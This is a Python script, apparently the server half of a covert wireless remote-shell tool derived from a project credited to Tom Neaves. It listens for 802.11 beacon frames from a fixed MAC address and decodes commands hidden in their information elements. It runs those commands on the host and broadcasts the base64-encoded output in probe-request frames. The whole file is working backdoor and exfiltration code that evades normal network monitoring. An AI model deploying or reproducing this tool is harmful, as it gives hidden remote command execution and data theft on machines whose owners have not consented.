#!/usr/bin/python
# Based on smuggler project by Tom Neaves

# Library imports 
import sys,time,subprocess,logging,base64
import logging.handlers
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import * 

# Variable Definition
verbosity=0
mackey="00:01:02:03:04:05"
mtu=252
chunks=5
try:
	interface=sys.argv[1]
except:
	print "Usage: python server.py mon_iface"
	quit()

# Define syslogging
slogger = logging.getLogger('OBJLogger')
slogger.setLevel(logging.ERROR)
shandler = logging.handlers.SysLogHandler(address = '/dev/log')
slogger.addHandler(shandler)

# Split command output in necessary chunks (arguments: input, chunksize, chunks) 
def splitbysize(input,chunksize,chunks):
	output = [input[i: chunksize+i] for i in range(0, len(input), chunksize)]
	for i in range(len(output),chunks):
		output.append('')
	return output

# Command execution by subprocess (argument: command to execute)
def executeHere(cmd):
	print "Command requested: " + cmd
	slogger.critical('Wireless Shell: Command requested: '+ cmd)
	cmd = cmd.split(" ")

	p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	out, err = p.communicate()
	out = out.rstrip("\n")  # STDOUT
	err = err.rstrip("\n")  # STDERR

	if len(out) == 0: # No STDOUT?
		if verbosity > 2: print "Command STDERR: "
		if verbosity > 2: print err
		out = err
	else:  # STDOUT present
		if verbosity > 2: print "Command STDOUT: "
		if verbosity > 2: print out
	if len(out) == 0:  # No command output
		out = "No command output!" 

	# Encode command output in base64
	outb64 = base64.b64encode(out)

	# Split command output (base64) in chunks
	# Cut max size (mtu*5) of output = substr()
	outsplit = splitbysize(outb64,mtu,chunks)

	if verbosity: print "Output Length: %d(std)/%d(base64)" %(len(out),len(outb64))
	if verbosity: print "Output Chunks: %d (size:%d)" %(len(outsplit),mtu)
	if verbosity > 1: print out
	if verbosity > 1: print outsplit
	
	probereq =  RadioTap()
	probereq /= Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff", addr2=mackey, addr3="ff:ff:ff:ff:ff:ff")
	probereq /= Dot11Elt(ID=0,info=outsplit[0])
	probereq /= Dot11Elt(ID=1,info=outsplit[1])
	probereq /= Dot11Elt(ID=2,info=outsplit[2])
	probereq /= Dot11Elt(ID=3,info=outsplit[3])
	probereq /= Dot11Elt(ID=4,info=outsplit[4])

	if verbosity > 1: print "Sending output in Probe Request..."
	if verbosity > 1: probereq.show()
	if verbosity > 2: wrpcap('./server_probereq.cap',probereq)
	time.sleep(2)
	
	try:
		sendp(probereq, iface=interface, verbose=verbosity, count=10)
	except Exception,e:
		print "Exception while sending: " + str(e)
		exprobereq =  RadioTap()
		exprobereq /= Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff", addr2=mackey, addr3="ff:ff:ff:ff:ff:ff")
		exprobereq /= Dot11Elt(ID=0,info=base64.b64encode(str(e)))
		sendp(exprobereq, iface=interface, verbose=verbosity, count=10)

# Packets function to process received packets
def packets(pkt):
	try:
		if pkt.haslayer(Dot11):
			# We expect to receive a specific beacon frame
			if pkt.type == 0 and pkt.subtype == 8 and pkt.addr2 == mackey:
				# Decode requested command in base64
				cmd = str(base64.b64decode(pkt[Dot11Elt:2].info))
				# Execute command and send output in probe request frame
				executeHere(cmd)
				return True
	except Exception,e:
		print "Something extrange error happened (It wasnt me!): " + str(e)

# Main section
while True:
	try:
		print "\nSniffing for packets..."
		# Start sniffing and stop when received specific beacon
		sniff(iface=interface, stop_filter=packets)
	except Exception,e:
		print "Exception while sniffing: " + str(e)
